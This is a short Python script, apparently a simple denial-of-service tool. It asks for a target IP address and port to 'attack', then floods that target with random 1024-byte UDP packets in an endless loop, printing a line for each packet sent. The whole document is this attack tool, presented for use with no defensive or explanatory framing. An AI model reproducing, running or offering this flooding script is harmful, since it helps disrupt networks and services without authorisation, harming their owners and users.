#!/usr/bin/env python

import socket
import random
import time

# IP and port of the target
target_ip = str(input("Enter the IP you want to attack   "))
target_port = int(input("Enter the port you want to attack: "))

# Create a socket object
client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# Generate random bytes to send
bytes = random._urandom(1024)

# Send packets repeatedly
while(1):
    client.sendto(bytes, (target_ip, target_port))
    print("[+] Packet sent")
    time.sleep(0.2)